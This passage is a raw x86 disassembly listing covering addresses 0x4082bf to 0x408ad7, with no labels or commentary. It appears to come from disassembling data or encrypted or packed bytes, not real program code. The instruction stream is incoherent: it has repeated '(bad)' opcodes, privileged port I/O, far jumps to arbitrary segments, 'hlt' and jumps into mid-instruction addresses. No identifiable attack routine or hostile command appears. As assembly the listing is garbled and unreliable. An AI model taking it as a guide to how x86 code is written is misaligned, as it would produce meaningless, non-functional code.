  4082bf:	add    DWORD PTR [esi-0x4bda8c47],0x67
  4082c6:	gs push edx
  4082c8:	mov    edi,0xa11669ad
  4082cd:	or     esp,DWORD PTR [ecx]
  4082cf:	shl    BYTE PTR [ebp-0x5e3734d4],0xc8
  4082d6:	mov    ebx,0xadf0d5b7
  4082db:	scas   eax,DWORD PTR es:[edi]
  4082dc:	arpl   WORD PTR [esi],ax
  4082de:	loop   0x40828b
  4082e0:	adc    BYTE PTR [ebx],ch
  4082e2:	lea    eax,[edx-0x632f9d6]
  4082e8:	xchg   ebp,eax
  4082e9:	enter  0x3680,0x62
  4082ed:	ficomp DWORD PTR [ebx]
  4082ef:	adc    DWORD PTR [esi+0x8],0x74e9d722
  4082f6:	jmp    0x226f0971
  4082fb:	inc    esp
  4082fc:	aam    0xa
  4082fe:	and    al,BYTE PTR [ebx]
  408300:	add    BYTE PTR [ebx+0x3d95d511],dh
  408306:	dec    esp
  408307:	in     al,0x8c
  408309:	fisub  WORD PTR [eax-0x3]
  40830c:	mov    al,0x7b
  40830e:	(bad)
  408311:	das    
  408312:	popf   
  408313:	push   0x2272316e
  408318:	ds shr ebp,cl
  40831b:	mov    eax,DWORD PTR [ecx]
  40831d:	fistp  WORD PTR [edi-0x6c62ab79]
  408323:	fidivr DWORD PTR [esi-0x28]
  408326:	scas   eax,DWORD PTR es:[edi]
  408327:	loopne 0x408388
  408329:	int3   
  40832a:	lahf   
  40832b:	aad    0x9a
  40832d:	adc    al,0xdd
  40832f:	and    edi,DWORD PTR ds:0xdd1ffb2b
  408335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408336:	in     eax,0x1b
  408338:	ds push ebx
  40833a:	push   edx
  40833b:	inc    ecx
  40833c:	jne    0x408373
  40833e:	mov    ebp,0xd38eeb1c
  408343:	pop    eax
  408344:	in     eax,dx
  408345:	test   bh,al
  408347:	fisub  WORD PTR [ebx+0x75bb0300]
  40834d:	mov    ah,0x7c
  40834f:	jns    0x408384
  408351:	inc    ebx
  408352:	dec    edi
  408353:	mov    ch,0xba
  408355:	jno    0x40835d
  408357:	lods   al,BYTE PTR ds:[esi]
  408358:	ds push ebp
  40835a:	in     al,dx
  40835b:	mov    bh,0xf5
  40835d:	sbb    dl,BYTE PTR [ebx-0x79]
  408360:	cmp    al,0xdc
  408362:	lahf   
  408363:	fadd   DWORD PTR [edx+ebp*1]
  408366:	rcr    BYTE PTR [ebx+eiz*4],0x12
  40836a:	outs   dx,DWORD PTR ds:[esi]
  40836b:	push   cs
  40836c:	xor    al,BYTE PTR [eax-0x685ddfbe]
  408372:	cmp    edi,ebx
  408374:	pusha  
  408375:	dec    eax
  408376:	push   edx
  408377:	pop    esi
  408378:	xor    DWORD PTR [ebp+0x14],esi
  40837b:	cmp    bl,BYTE PTR [ecx-0x461dcb52]
  408381:	ss cmp al,cl
  408384:	leave  
  408385:	mov    ds:0x6daab13a,eax
  40838a:	or     BYTE PTR [ebx],ch
  40838c:	push   edi
  40838d:	ret    0xa705
  408390:	call   0x7d95bf7c
  408395:	dec    ebp
  408396:	pop    edi
  408397:	stc    
  408398:	fidiv  DWORD PTR [eax]
  40839a:	and    ecx,DWORD PTR [ebp+0x3]
  40839d:	jle    0x40834d
  40839f:	inc    edx
  4083a0:	jl     0x4083b9
  4083a2:	retf   0x9226
  4083a5:	test   eax,0x604412b5
  4083aa:	cmp    esp,DWORD PTR [eax-0x35e116fb]
  4083b0:	sbb    BYTE PTR [esi+edx*4],0x7
  4083b4:	xchg   DWORD PTR [eax+0x41],esp
  4083b7:	sahf   
  4083b8:	arpl   WORD PTR [eax-0x535ea0fb],bx
  4083be:	repnz lods al,BYTE PTR ds:[esi]
  4083c0:	pop    ss
  4083c1:	sub    ecx,esp
  4083c3:	jno    0x40843f
  4083c5:	sub    eax,0x5d8e86df
  4083ca:	and    DWORD PTR ds:0xc1feae85,ebp
  4083d0:	pushf  
  4083d1:	(bad)  
  4083d2:	lds    eax,FWORD PTR [ebx]
  4083d4:	retf   0x1559
  4083d7:	dec    edi
  4083d8:	push   eax
  4083d9:	push   edi
  4083da:	and    al,0xcf
  4083dc:	xchg   esp,eax
  4083dd:	add    ch,dh
  4083df:	sahf   
  4083e0:	add    DWORD PTR [eax],esi
  4083e2:	sbb    bh,dl
  4083e4:	and    al,BYTE PTR [eax+0x75]
  4083e7:	mov    al,ds:0x3b3223d1
  4083ec:	fild   DWORD PTR [esi-0x49]
  4083ef:	cmp    eax,0x1c2f8ca
  4083f4:	inc    ecx
  4083f5:	test   BYTE PTR [edi+eax*4],cl
  4083f8:	neg    BYTE PTR [ebp+0x1af5f0d3]
  4083fe:	aam    0x6b
  408400:	pushf  
  408401:	es sub al,0xdc
  408404:	or     eax,0x758b44a
  408409:	inc    ecx
  40840a:	xor    esi,esp
  40840c:	inc    edi
  40840d:	dec    ebp
  40840e:	shl    BYTE PTR [edx+0x77f62e0c],0x40
  408415:	loopne 0x408436
  408417:	stos   BYTE PTR es:[edi],al
  408418:	test   bh,bh
  40841a:	mov    bl,0x62
  40841c:	jmp    0x7eb3:0x99aa885f
  408423:	setp   BYTE PTR [edi-0x2faa08ba]
  40842a:	jge    0x4083fd
  40842c:	xor    eax,0x93bc7b7f
  408431:	lahf   
  408432:	shr    BYTE PTR [esi-0x33],1
  408435:	fdivr  QWORD PTR [edi]
  408437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408438:	cmp    eax,0xef38a39e
  40843d:	mov    ecx,0x1843fda5
  408442:	dec    ecx
  408443:	adc    DWORD PTR [esp+ebx*1+0x51],0xf365173d
  40844b:	lahf   
  40844c:	cmp    al,0xa1
  40844e:	lea    esp,[edx+0x12]
  408451:	pop    eax
  408452:	int    0x1e
  408454:	xlat   BYTE PTR ss:[ebx]
  408456:	xor    eax,0xb47cd2d8
  40845b:	in     eax,0x33
  40845d:	jge    0x40846b
  40845f:	rol    DWORD PTR [ebx+0x7a],0x34
  408463:	es pop edx
  408465:	mov    ebx,0x98ea1ac0
  40846a:	es in  eax,dx
  40846c:	xor    ebx,DWORD PTR [eax+0x39cec613]
  408472:	loopne 0x408421
  408474:	sub    al,0x9
  408476:	pusha  
  408477:	fwait
  408478:	push   es
  408479:	cs scas al,BYTE PTR es:[edi]
  40847b:	aam    0xbe
  40847d:	jns    0x40843a
  40847f:	fwait
  408480:	ret    0x638f
  408483:	test   cl,bh
  408485:	add    eax,0xa75d4fca
  40848a:	adc    WORD PTR [esi-0x34],si
  40848e:	bound  edi,QWORD PTR [ebx]
  408490:	cmp    DWORD PTR [edi-0x75],edx
  408493:	out    0x5e,eax
  408495:	cli    
  408496:	dec    ecx
  408497:	inc    ebx
  408498:	lahf   
  408499:	hlt    
  40849a:	push   ds
  40849b:	ds inc ebx
  40849d:	add    DWORD PTR [bp+di-0x66d7],eax
  4084a2:	rcl    BYTE PTR [esi+ecx*4+0x5c43ba6],cl
  4084a9:	rol    al,0xa
  4084ac:	add    ch,BYTE PTR [edx+ecx*4-0x3494fbe5]
  4084b3:	std    
  4084b4:	jmp    0x8e01:0xddbac3c7
  4084bb:	stc    
  4084bc:	in     al,0xb9
  4084be:	and    al,dl
  4084c0:	fs add eax,0x8a069deb
  4084c6:	push   ds
  4084c7:	sub    al,0x46
  4084c9:	pushf  
  4084ca:	mov    DWORD PTR [esi+0x6c],ecx
  4084cd:	mov    al,0x22
  4084cf:	cmp    al,0xdf
  4084d1:	test   DWORD PTR [ebx-0x3e],esp
  4084d4:	push   edx
  4084d5:	mov    DWORD PTR [ebp-0x60766f56],ebp
  4084db:	jmp    0xcad8dc7f
  4084e0:	mov    eax,0xc1279c8
  4084e5:	jl     0x408513
  4084e7:	jg     0x4084a6
  4084e9:	stos   BYTE PTR es:[edi],al
  4084ea:	add    dl,BYTE PTR [edx+0x367bf20]
  4084f0:	lods   al,BYTE PTR ds:[esi]
  4084f1:	cmp    BYTE PTR [edx+0x42],bh
  4084f4:	push   ds
  4084f5:	popf   
  4084f6:	cs iret 
  4084f8:	cwde   
  4084f9:	mov    ebx,0x37751147
  4084fe:	ins    DWORD PTR es:[edi],dx
  4084ff:	and    al,BYTE PTR [ecx-0x65]
  408502:	das    
  408503:	outs   dx,DWORD PTR ds:[esi]
  408504:	push   cs
  408505:	(bad)  
  408506:	fdivr  DWORD PTR [ebx-0x60a67]
  40850c:	jbe    0x40857c
  40850e:	mov    edx,ecx
  408510:	xor    dl,BYTE PTR [eax]
  408512:	or     edx,esi
  408514:	rcr    DWORD PTR [edi+0x656bc25e],0xc4
  40851b:	add    bh,bh
  40851d:	sbb    eax,0x86acd9eb
  408522:	(bad)  
  408523:	out    0x21,al
  408525:	retf   
  408526:	stc    
  408527:	int    0x3d
  408529:	mov    cl,BYTE PTR [edx-0x6a]
  40852c:	popa   
  40852d:	outs   dx,BYTE PTR ds:[esi]
  40852e:	xlat   BYTE PTR ds:[ebx]
  40852f:	mov    dl,0x9f
  408531:	dec    ebp
  408532:	pushf  
  408533:	add    bh,BYTE PTR gs:[edx+0x684a4dbb]
  40853a:	pop    eax
  40853b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40853c:	sub    BYTE PTR [ebp+0x49],ah
  40853f:	sub    eax,0x4c7fa1c4
  408544:	test   eax,0x1ad20297
  408549:	push   ecx
  40854a:	sahf   
  40854b:	adc    BYTE PTR [edi+esi*2],ah
  40854e:	call   0xaab5:0xa8462a29
  408555:	les    esi,FWORD PTR [edx+0x29]
  408558:	mov    DWORD PTR [ecx-0x28648c0f],eax
  40855e:	xchg   BYTE PTR [ecx-0x711c041b],dl
  408564:	ds xchg edi,eax
  408566:	mov    ch,0x2c
  408568:	mov    ds:0xb6a79355,al
  40856d:	test   al,0x1
  40856f:	imul   ecx,DWORD PTR [edi],0x6a
  408572:	jo     0x408555
  408574:	jno    0x4085b5
  408576:	adc    DWORD PTR [edx],edx
  408578:	fldcw  WORD PTR [ecx-0x2e1ad2f4]
  40857e:	ss jl  0x4085ae
  408581:	lock (bad) 
  408583:	dec    esi
  408584:	ss loope 0x408557
  408587:	pop    esp
  408588:	aad    0x55
  40858a:	fcom   st(2)
  40858c:	push   ebx
  40858d:	sbb    al,0xb6
  40858f:	std    
  408590:	push   edi
  408591:	fcomi  st,st(6)
  408593:	in     al,dx
  408594:	adc    al,0x85
  408596:	loopne 0x4085b5
  408598:	js     0x408524
  40859a:	cmp    dl,BYTE PTR [edx]
  40859c:	sahf   
  40859d:	sbb    BYTE PTR [eax+0x78],al
  4085a0:	jmp    0x2f7d:0xc38cc96f
  4085a7:	daa    
  4085a8:	ror    BYTE PTR [edi],cl
  4085aa:	and    DWORD PTR [ebx+0x40925c7b],0x45
  4085b1:	dec    edx
  4085b2:	inc    edi
  4085b3:	das    
  4085b4:	fnsave [eax-0x29]
  4085b7:	mov    bh,0xcc
  4085b9:	mov    ecx,0x2e6b433d
  4085be:	cmc    
  4085bf:	sub    BYTE PTR [edi+edx*4-0xb3d49ad],bl
  4085c6:	(bad)  [ebp-0x57]
  4085c9:	inc    ebx
  4085ca:	sbb    eax,0x9fb69186
  4085cf:	mov    edx,0x5c2df28
  4085d4:	adc    ebx,DWORD PTR [esi-0x6d18b201]
  4085da:	pop    ds
  4085db:	cmp    DWORD PTR [ecx+ebx*8+0x3aa541fb],ebp
  4085e2:	les    esi,FWORD PTR ds:0xfa49268
  4085e8:	xchg   esp,eax
  4085e9:	in     eax,dx
  4085ea:	xor    ecx,DWORD PTR [ecx-0x5d9c4de8]
  4085f0:	xchg   edi,eax
  4085f1:	imul   eax,DWORD PTR [edx],0x67a1e1b6
  4085f7:	mov    al,0x25
  4085f9:	call   0xef22:0xdbff3bdb
  408600:	and    dl,al
  408602:	pushf  
  408603:	pop    esp
  408604:	mov    al,0x14
  408606:	xor    DWORD PTR [edx-0x6b],esp
  408609:	xlat   BYTE PTR ds:[ebx]
  40860a:	xor    esp,DWORD PTR [eax]
  40860c:	(bad)  
  40860d:	mov    dh,0x43
  40860f:	mov    dh,0xf3
  408611:	into   
  408612:	sub    ebx,esi
  408614:	mov    ?,WORD PTR [esi+0x51ea48f]
  40861a:	daa    
  40861b:	or     edx,DWORD PTR [ebx-0x67]
  40861e:	(bad)  
  40861f:	and    eax,0x393b0d15
  408624:	test   DWORD PTR [edx],eax
  408626:	sbb    bh,BYTE PTR [ecx]
  408628:	xchg   edi,ecx
  40862a:	cmp    BYTE PTR [ebx+0x79],al
  40862d:	jp     0x408619
  40862f:	push   eax
  408630:	xor    BYTE PTR [esi-0x29],ch
  408633:	add    eax,0x5496cbb5
  408638:	and    ah,ch
  40863a:	jbe    0x4085c1
  40863c:	or     al,0xfc
  40863e:	mov    ah,0x69
  408640:	push   0xe9d04497
  408645:	and    DWORD PTR [ebx],0xfda39e75
  40864b:	jns    0x4086b7
  40864d:	pop    esi
  40864e:	sbb    al,0x65
  408650:	jle    0x408690
  408652:	inc    esi
  408653:	mov    cl,0xcc
  408655:	repz das 
  408657:	xor    DWORD PTR [ebp-0x62a0c39e],0xe
  40865e:	jl     0x40869d
  408660:	jmp    0x9d233297
  408665:	push   edx
  408666:	nop
  408667:	fnsave [ebx+0x77]
  40866a:	mov    WORD PTR [edi],fs
  40866c:	in     eax,dx
  40866d:	outs   dx,DWORD PTR ds:[esi]
  40866e:	les    edx,FWORD PTR [ebx]
  408670:	sub    al,0x3
  408672:	sbb    DWORD PTR [esi],0x18
  408675:	jae    0x408666
  408677:	ss xchg esi,eax
  408679:	mov    ch,0x67
  40867b:	jno    0x408664
  40867d:	push   esi
  40867e:	cmp    dh,dh
  408680:	cmp    eax,0x6d4b1e05
  408685:	jle    0x408649
  408687:	or     eax,esi
  408689:	mov    ds:0x74855ac6,eax
  40868e:	lahf   
  40868f:	outs   dx,DWORD PTR ds:[esi]
  408690:	cdq    
  408691:	das    
  408692:	jno    0x408640
  408694:	jno    0x40868d
  408696:	mov    ebp,0xeddcf0ab
  40869b:	pop    ecx
  40869c:	cli    
  40869d:	loop   0x4086c0
  40869f:	push   ds
  4086a0:	jo     0x408655
  4086a2:	cmp    dl,dh
  4086a4:	xor    ch,al
  4086a6:	mov    edx,0xfdc4dbab
  4086ab:	xchg   BYTE PTR [edi-0x35],ah
  4086ae:	ret    0xfc31
  4086b1:	mov    edi,0x85a1dec6
  4086b6:	jmp    0x6d9c8dcc
  4086bb:	aas    
  4086bc:	call   0xd47d:0xb253ddf
  4086c3:	add    DWORD PTR [edi-0x2d],esi
  4086c6:	inc    ebx
  4086c7:	repz push ebx
  4086c9:	ret    0x68a6
  4086cc:	and    al,0x3
  4086ce:	push   edx
  4086cf:	adc    BYTE PTR [esi],bh
  4086d1:	test   ch,ch
  4086d3:	inc    edx
  4086d4:	rcr    DWORD PTR [ebp-0x5d0b6874],1
  4086da:	jl     0x408685
  4086dc:	js     0x40870b
  4086de:	arpl   si,cx
  4086e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086e1:	sbb    bh,ch
  4086e3:	fs mov al,0x16
  4086e6:	adc    BYTE PTR [edi-0x2],dl
  4086e9:	mov    esi,0xae6facba
  4086ee:	dec    ebx
  4086ef:	hlt    
  4086f0:	adc    al,0x6a
  4086f2:	or     ebx,esi
  4086f4:	jecxz  0x408733
  4086f6:	mov    esp,0xfadb81d3
  4086fb:	mov    al,ds:0xc1e22b62
  408700:	retf   0x35f5
  408703:	arpl   WORD PTR [bx+si-0x72],dx
  408707:	sub    edi,DWORD PTR ds:0x90cd2f26
  40870d:	jmp    0x19632ad7
  408712:	pop    eax
  408713:	lods   al,BYTE PTR ds:[esi]
  408714:	adc    ecx,DWORD PTR [esi-0x1dca65ec]
  40871a:	xlat   BYTE PTR ds:[ebx]
  40871b:	dec    ebp
  40871c:	ror    ebx,0x60
  40871f:	mov    ds:0xb483ab35,al
  408724:	mov    fs,edi
  408726:	sub    dl,0xd7
  408729:	sub    ah,BYTE PTR [edx+0x6]
  40872c:	shl    BYTE PTR [eax-0x66],0x41
  408730:	ss stos BYTE PTR es:[edi],al
  408732:	imul   edx,DWORD PTR [ecx+ebp*4+0x5a],0xffffffdf
  408737:	pop    ecx
  408738:	test   al,0x4d
  40873a:	and    al,0xe1
  40873c:	push   cs
  40873d:	inc    esi
  40873e:	ds sti 
  408740:	push   eax
  408741:	jp     0x4087aa
  408743:	push   ss
  408744:	popf   
  408745:	mov    edi,0xddbf985f
  40874a:	dec    edi
  40874b:	rcr    DWORD PTR [eax-0x4dd53161],cl
  408751:	gs das 
  408753:	push   cs
  408754:	jb     0x4086de
  408756:	sbb    BYTE PTR [bp+0x1d],al
  40875a:	mov    BYTE PTR [ebx],bh
  40875c:	push   edi
  40875d:	sbb    ebx,DWORD PTR [ebp-0x12aeac50]
  408763:	lds    ecx,FWORD PTR [eax-0xf]
  408766:	xchg   edx,eax
  408767:	lock mov bh,0x63
  40876a:	xor    ch,BYTE PTR [edx+0x3]
  40876d:	ja     0x4087be
  40876f:	sbb    edx,eax
  408771:	out    0x68,eax
  408773:	xor    dl,al
  408775:	jnp    0x408709
  408777:	imul   ecx,DWORD PTR [ecx+esi*1+0x614d3c42],0x74
  40877f:	dec    ebx
  408780:	cld    
  408781:	pop    esi
  408782:	and    esp,DWORD PTR [eax-0x68c97c36]
  408788:	pushf  
  408789:	jne    0x4087b9
  40878b:	adc    al,0xc2
  40878d:	pusha  
  40878e:	pop    edi
  40878f:	jo     0x4087d8
  408791:	jb     0x408715
  408793:	or     dh,bl
  408795:	mov    eax,0xe564f748
  40879a:	add    DWORD PTR [edi+0x500d9283],edi
  4087a0:	push   edi
  4087a1:	dec    edx
  4087a2:	in     al,0x14
  4087a4:	and    al,0xbc
  4087a6:	inc    ebp
  4087a7:	lahf   
  4087a8:	adc    BYTE PTR [edi-0x5ab863be],bh
  4087ae:	add    DWORD PTR [eax-0x7ed10fdc],edx
  4087b4:	pop    edx
  4087b5:	inc    eax
  4087b6:	cld    
  4087b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087b8:	(bad)  
  4087b9:	adc    DWORD PTR [ebx],esp
  4087bb:	sub    al,0x2b
  4087bd:	adc    al,0x6a
  4087bf:	mov    bl,0x15
  4087c1:	std    
  4087c2:	push   cs
  4087c3:	cli    
  4087c4:	add    DWORD PTR [esi],ecx
  4087c6:	pop    esi
  4087c7:	not    BYTE PTR [ecx-0xb675db6]
  4087cd:	pop    esp
  4087ce:	cdq    
  4087cf:	ror    edi,cl
  4087d1:	xor    DWORD PTR [ebp+0x38ebea27],ebx
  4087d7:	pop    edi
  4087d8:	dec    esp
  4087d9:	nop
  4087da:	jle    0x40879d
  4087dc:	stc    
  4087dd:	add    BYTE PTR [esi+ebp*8+0x547aae14],ch
  4087e4:	pop    ds
  4087e5:	gs inc edx
  4087e7:	out    dx,eax
  4087e8:	pop    esi
  4087e9:	cdq    
  4087ea:	mov    al,0x83
  4087ec:	cmp    al,0x18
  4087ee:	mov    cs,WORD PTR [ebx+0x76]
  4087f1:	adc    ebp,esp
  4087f3:	iret   
  4087f4:	add    BYTE PTR [ebx+0x41e74d15],al
  4087fa:	jmp    0xa3a2:0xdd841c40
  408801:	sub    al,0x5e
  408803:	push   edx
  408804:	out    dx,eax
  408805:	gs into 
  408807:	jnp    0x4087e5
  408809:	and    esp,esp
  40880b:	jg     0x40881d
  40880d:	mov    esp,0x3a38b120
  408812:	sub    DWORD PTR [ebx+0x1df8d898],0x8b1480d9
  40881c:	imul   DWORD PTR [esi-0x585b9c5a]
  408822:	shrd   DWORD PTR cs:[ebx],esi,0xc1
  408827:	mov    ch,0x68
  408829:	inc    esi
  40882a:	sub    ebx,edi
  40882c:	add    edx,ebx
  40882e:	lahf   
  40882f:	(bad)  
  408830:	fcomp  st(2)
  408832:	mov    BYTE PTR [edi+0x2d],dl
  408835:	out    dx,eax
  408836:	rcr    ch,cl
  408838:	lock sub ah,BYTE PTR [eax-0x51035669]
  40883f:	pop    esi
  408840:	mov    al,0x59
  408842:	push   eax
  408843:	in     eax,0x8a
  408845:	pop    eax
  408846:	sub    eax,0x64681b24
  40884b:	mov    bl,0x8f
  40884d:	mov    bl,0xc1
  40884f:	clc    
  408850:	fcom   QWORD PTR [ebx+0x72534dd8]
  408856:	inc    edx
  408857:	push   ss
  408858:	test   eax,0x9174f22b
  40885d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885e:	sbb    ah,BYTE PTR [ebx]
  408860:	push   esp
  408861:	push   ecx
  408862:	pop    es
  408863:	aas    
  408864:	dec    esi
  408865:	push   es
  408866:	cld    
  408867:	jecxz  0x40888f
  408869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40886a:	pop    edi
  40886b:	mov    edx,0x7fe3021b
  408870:	or     ch,BYTE PTR [ebx+0x20]
  408873:	push   ds
  408874:	mov    eax,0x8a5a4a93
  408879:	lods   eax,DWORD PTR ds:[esi]
  40887a:	cmp    ah,BYTE PTR [ebp-0x655d1a9d]
  408880:	inc    edi
  408881:	push   ss
  408882:	mov    cs,WORD PTR [edx]
  408884:	(bad)  
  408886:	dec    edx
  408887:	cmc    
  408888:	push   bx
  40888a:	fisttp QWORD PTR [ebp+0x68]
  40888d:	les    esp,FWORD PTR [ebp-0x103963c1]
  408893:	xor    eax,0xce70145f
  408898:	mov    eax,0x82d09e4e
  40889d:	push   esp
  40889e:	jae    0x4088a2
  4088a0:	out    0xec,eax
  4088a2:	enter  0x5099,0x75
  4088a6:	das    
  4088a7:	dec    esi
  4088a8:	and    DWORD PTR [edi],edx
  4088aa:	shr    DWORD PTR [edi+edx*4],0x18
  4088ae:	inc    edi
  4088af:	mov    ah,BYTE PTR [edx-0x7f]
  4088b2:	dec    edx
  4088b3:	mov    eax,ds:0x13b22ccf
  4088b8:	or     ebx,DWORD PTR [ecx-0x226263b3]
  4088be:	enter  0xc9b8,0x38
  4088c2:	inc    ebx
  4088c3:	jge    0x4088fb
  4088c5:	and    eax,0x2a7f03d
  4088ca:	mov    BYTE PTR [ebp-0x6dc66fd2],dh
  4088d0:	pop    edi
  4088d1:	pop    esp
  4088d2:	call   0x7c71:0xef7abe78
  4088d9:	adc    bh,BYTE PTR [ebx]
  4088db:	push   ss
  4088dc:	retf   
  4088dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088de:	adc    edi,DWORD PTR [edi-0x6458e57]
  4088e4:	dec    eax
  4088e5:	imul   ecx,DWORD PTR [eax],0xffffff8c
  4088e8:	pusha  
  4088e9:	lods   al,BYTE PTR ds:[esi]
  4088ea:	adc    eax,0xfd07a82
  4088ef:	je     0x40888a
  4088f1:	jno    0x408959
  4088f3:	sub    BYTE PTR [eax-0x3ea2654a],ah
  4088f9:	add    eax,0x88466891
  4088fe:	pop    edx
  4088ff:	outs   dx,BYTE PTR ds:[esi]
  408900:	cwde   
  408901:	ja     0x408926
  408903:	adc    BYTE PTR ds:0x3dc1a4ae,bh
  408909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40890a:	mov    ebx,0xfdf95c79
  40890f:	neg    BYTE PTR [edx+eiz*1]
  408912:	mov    DWORD PTR [eax+0x1eebe286],edi
  408918:	imul   esp,DWORD PTR [edi+0x4cebe53d],0xffffffe8
  40891f:	not    DWORD PTR [edx]
  408921:	xchg   edi,eax
  408922:	pop    ss
  408923:	popf   
  408924:	imul   BYTE PTR [esi]
  408926:	bound  edx,QWORD PTR [esi-0x1f]
  408929:	(bad)  
  40892a:	mov    ch,0xe4
  40892c:	addr16 cmp al,0xea
  40892f:	scas   eax,DWORD PTR es:[edi]
  408930:	sub    ebx,ecx
  408932:	xor    al,0xb9
  408934:	aam    0x14
  408936:	pop    ebp
  408937:	pop    ebx
  408938:	push   eax
  408939:	and    cl,ah
  40893b:	cld    
  40893c:	inc    ebp
  40893d:	mov    ecx,0xd2afd9f1
  408942:	fld    DWORD PTR [edx-0x1d]
  408945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408946:	sbb    BYTE PTR [esi-0x17],ah
  408949:	cld    
  40894a:	push   esp
  40894b:	clc    
  40894c:	lock hlt 
  40894e:	push   es
  40894f:	add    ebx,ebp
  408951:	xor    esi,DWORD PTR [bp+di]
  408954:	and    ecx,DWORD PTR [ecx-0x73]
  408957:	mov    edx,0x747f215a
  40895c:	pop    edi
  40895d:	mov    DWORD PTR ds:0xd8c8180,ebx
  408963:	into   
  408964:	add    BYTE PTR [edx+0x1c],0xca
  408968:	mov    dl,0x87
  40896a:	or     dl,dl
  40896c:	enter  0xadba,0xfe
  408970:	lock pop ebx
  408972:	adc    eax,0xfa1963c8
  408977:	retf   
  408978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408979:	inc    edi
  40897a:	call   0x3190:0xd9b690fe
  408981:	lahf   
  408982:	sti    
  408983:	ret    0x4f63
  408986:	nop
  408987:	(bad)  
  408988:	push   0x8f43c8c1
  40898d:	mov    bl,0x4d
  40898f:	cmp    cl,bh
  408991:	inc    eax
  408992:	int    0x36
  408994:	mov    WORD PTR [esi],?
  408996:	jnp    0x408925
  408998:	or     esp,DWORD PTR [ebx+0xc]
  40899b:	or     eax,0x335bd843
  4089a0:	rcr    BYTE PTR [esi-0x2f],0xad
  4089a4:	or     DWORD PTR [edi-0x1f],eax
  4089a7:	cmp    edi,ebp
  4089a9:	imul   esi,DWORD PTR [eax+ebp*4-0x57dae31],0xffffffe0
  4089b1:	jg     0x40894f
  4089b3:	call   0xab6d8898
  4089b8:	add    ebp,edi
  4089ba:	mov    bh,0xc8
  4089bc:	rol    edx,1
  4089be:	retf   
  4089bf:	lods   al,BYTE PTR ds:[esi]
  4089c0:	clc    
  4089c1:	shr    esi,1
  4089c3:	in     al,0xad
  4089c5:	mov    edx,0xca60f737
  4089ca:	imul   ebp,DWORD PTR [esi-0x7],0x34
  4089ce:	ins    DWORD PTR es:[edi],dx
  4089cf:	cmp    edx,edx
  4089d1:	out    0x99,eax
  4089d3:	xor    al,dl
  4089d5:	push   esi
  4089d6:	adc    BYTE PTR ds:0x2923b487,cl
  4089dc:	sbb    bl,dl
  4089de:	or     bh,BYTE PTR [edx-0x17e0504d]
  4089e4:	add    ebp,esi
  4089e6:	dec    ecx
  4089e7:	test   DWORD PTR [edx-0x1],eax
  4089ea:	stos   BYTE PTR es:[edi],al
  4089eb:	pop    esp
  4089ec:	loope  0x4089b6
  4089ee:	hlt    
  4089ef:	push   ebp
  4089f0:	inc    ebp
  4089f1:	adc    al,0x1f
  4089f3:	test   eax,0x192818c1
  4089f8:	std    
  4089f9:	cmc    
  4089fa:	mov    edi,DWORD PTR [edi+eax*8+0x34]
  4089fe:	in     eax,0x93
  408a00:	pop    eax
  408a01:	gs out 0x28,al
  408a04:	setb   BYTE PTR [ebp-0x2b]
  408a08:	sub    al,BYTE PTR [ecx+edx*2]
  408a0b:	rcl    BYTE PTR [edx+0x4542bd8a],1
  408a11:	dec    ebx
  408a12:	jecxz  0x408a86
  408a14:	mov    BYTE PTR [eax+ecx*4+0x5a],dl
  408a18:	fwait
  408a19:	mov    ch,0xea
  408a1b:	out    0x34,eax
  408a1d:	imul   ebp,DWORD PTR [eax],0x20acbe5a
  408a23:	pop    ds
  408a24:	std    
  408a25:	jmp    0x6cca:0x707ba392
  408a2c:	idiv   ecx
  408a2e:	xchg   ebx,eax
  408a2f:	cs add ch,0x1
  408a33:	jle    0x408a49
  408a35:	cmp    dl,cl
  408a37:	out    0xe7,eax
  408a39:	xchg   ebp,eax
  408a3a:	or     eax,0x754ea341
  408a3f:	fistp  QWORD PTR [ebp-0x7e540697]
  408a45:	cmp    eax,0x39bd4b86
  408a4a:	or     BYTE PTR [esi-0x18],al
  408a4d:	push   bx
  408a4f:	jo     0x4089fb
  408a51:	mov    ds:0xf233bb2c,al
  408a56:	ja     0x408ad2
  408a58:	icebp  
  408a59:	adc    eax,0x50706e30
  408a5e:	sub    DWORD PTR [edi-0x47],esi
  408a61:	dec    ecx
  408a62:	push   0x23
  408a64:	cmovns ebx,edx
  408a67:	mov    eax,ds:0x811b0315
  408a6c:	leave  
  408a6d:	push   esp
  408a6e:	in     al,0xc
  408a70:	push   cs
  408a71:	mov    DWORD PTR [eax-0x37823ab9],ebx
  408a77:	add    DWORD PTR [edi+0x6af7890b],esi
  408a7d:	jb     0x408af4
  408a7f:	out    0xed,al
  408a81:	lds    ecx,FWORD PTR [ecx-0x2f]
  408a84:	jl     0x408ae4
  408a86:	jl     0x408ab8
  408a88:	or     eax,0x70ef0ad2
  408a8d:	xchg   edi,eax
  408a8e:	call   0x41be:0x61a12799
  408a95:	fcmovbe st,st(6)
  408a97:	imul   esp,DWORD PTR [ebp-0xb],0x53
  408a9b:	mov    dh,0x46
  408a9d:	jo     0x408a41
  408a9f:	leave  
  408aa0:	mov    fs,WORD PTR [edi-0x2]
  408aa3:	mov    ds:0x6d6dc08d,al
  408aa8:	test   eax,0xb3c4c2cb
  408aad:	imul   esp,edx,0x761f9ee2
  408ab3:	mov    ah,bh
  408ab5:	ins    DWORD PTR es:[edi],dx
  408ab6:	js     0x408a5c
  408ab8:	or     ch,BYTE PTR [esi]
  408aba:	clc    
  408abb:	popf   
  408abc:	mov    ebx,0xe098350e
  408ac1:	and    ch,BYTE PTR [ecx-0x2a]
  408ac4:	sub    al,0x4e
  408ac6:	xor    ah,dl
  408ac8:	test   BYTE PTR [ebx],bh
  408aca:	jne    0x408aa1
  408acc:	xor    dl,BYTE PTR [ebx]
  408ace:	loopne 0x408a83
  408ad0:	pushf  
  408ad1:	xchg   ebx,eax
  408ad2:	js     0x408b02
  408ad4:	jecxz  0x408a78
  408ad6:	push   esi
  408ad7:	xrelease xchg DWORD PTR [esi],ebx
